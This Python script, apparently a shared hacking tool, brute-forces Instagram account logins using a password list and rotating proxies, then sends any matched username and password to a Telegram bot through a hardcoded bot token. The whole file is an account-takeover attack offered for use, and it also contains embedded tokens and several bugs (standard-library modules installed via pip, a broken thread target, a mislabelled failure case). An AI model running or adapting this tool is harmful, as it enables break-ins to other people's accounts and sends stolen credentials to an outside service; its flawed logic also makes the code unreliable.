import os
os.system('pip install requests')
os.system('pip install random')
os.system('pip install time')
os.system("pip install threading")
os.system('cls' if os.name == 'nt' else 'clear')
pass
import requests
import random
from time import sleep
import threading

print("         by @index__.kr   ")
#krar ali
r = requests.session() #krar ali
url = 'https://www.instagram.com/accounts/login/ajax/'
#krar ali
Headers = {
"accept":"*/*",
"accept-encoding":"gzip, deflate,br",
"accept-language": "ar,en-US;q=0.9,en;q=0.8",
"content-length": "279",
"content-type": "application/x-www-form-urlencoded",
"origin": "https://www.instagram.com",
"referer": "https://www.instagram.com/",
"sec-fetch-dest":"empty",
"sec-fetch-site":"same-origin",
"user-agent":"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
"x-csrftoken": "lih2ypMfhzdqwMbm5jIILqxZDj4zLeCW",
"x-ig-app-id": "936619743392459",
"x-ig-www-claim": "hmac.AR1_p9SjMFQF73bcZgzygDgxb9yBZUn83e69xoDD2qpSdmtW",
"x-instagram-ajax":"901e37113a69",
"x-requested-with":"XMLHttpRequest"
}
token = '1866283895:AAESk2r3v3UyfONMBBicNOO71kVhWr3jQxE'
#krar ali
def Hack():
	id = input("Your Telegram ID : ")
	user = input("The Username of acc : ")
	gg = open("pass.txt", "r")
	while True :
		p = []
		for i in open("proxy.txt", "r").read().splitlines():
			p.append(i)
		rp = str(random.choice(p))
		password = gg.readline().split("/n")[0]
		try:
			r.proxies = {
				'http': 'http://{}'.format(rp),
				'https': 'https://{}'.format(rp)}
			data = {
				'username': user,
				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
				'queryParams': '{}',
				'optIntoOneTap': 'false'
	        }
			sleep(0)
			data2 = r.post(url,headers=Headers,data=data,proxies=r.proxies).text
			if ('userId') in data2:
				a = user + ':' f'{password}' + "//" + f'{rp}' + "Account Hacked"
				print(a)
				send = requests.get("https://api.telegram.org/bot"+token + "/sendMessage?chat_id="+id+"&text="+a)
				quit()
			else:
				c = user + ':' f'{password}' + "//" + f'{rp}' + " " + ":" + " " + "Account Hacked but Secure"
				send = requests.get("https://api.telegram.org/bot"+token + "/sendMessage?chat_id="+id+"&text="+c)
				print(c)
				quit()
		except requests.exceptions.ConnectionError:
			d = user + ':' f'{password}' + "//" + f'{rp}' + " " + ":" + " " + "Incorrect password"
			print(d)
#krar ali
opg = int("1000000000000")
t = []
for i in range(opg):
	t1 = threading.Thread(target=Hack())
	t1.start()
	t.append(t1)
for t2 in t:
	t2.join()
